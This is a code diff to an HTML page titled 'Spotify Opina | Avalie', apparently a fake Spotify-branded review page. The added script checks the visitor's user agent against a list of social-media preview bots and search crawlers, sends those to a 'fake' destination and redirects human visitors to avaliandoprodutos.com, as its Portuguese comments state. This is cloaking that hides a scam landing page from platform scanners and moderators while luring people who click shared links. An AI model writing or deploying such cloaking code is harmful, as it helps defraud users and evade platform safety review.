@@ -18,20 +18,38 @@
 </script>
 
 <script type="text/javascript">
-  //digite a url de redirect
-  var url_link_redirect_pc = "https://google.com";
+(function() {
+  var bots = [
+    "facebookexternalhit",
+    "Facebot",
+    "Twitterbot",
+    "Slackbot",
+    "TelegramBot",
+    "WhatsApp",
+    "Discordbot",
+    "Googlebot",
+    "bingbot",
+    "crawler",
+    "spider",
+    "robot",
+    "crawling"
+  ];
+  
+  var userAgent = navigator.userAgent.toLowerCase();
+  var isBot = bots.some(function(bot) {
+    return userAgent.indexOf(bot.toLowerCase()) !== -1;
+  });
 
-  //function js
-  function isMobile() {
-   const regex = /Mobi|Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
-   return regex.test(navigator.userAgent);
+  if (isBot) {
+    // Se for bot, manda pra fake
+    window.location.href = "https://";
+  } else {
+    // Se for humano, manda pra real
+    window.location.href = "https://avaliandoprodutos.com";
   }
+})();
+</script>
 
-  //validation js
-  if (isMobile()) { console.log("Mobile device detected"); } else {
-   window.location = url_link_redirect_pc;
-  }
- </script>
 
 <title>Spotify Opina | Avalie</title>
 <meta charset="utf-8">
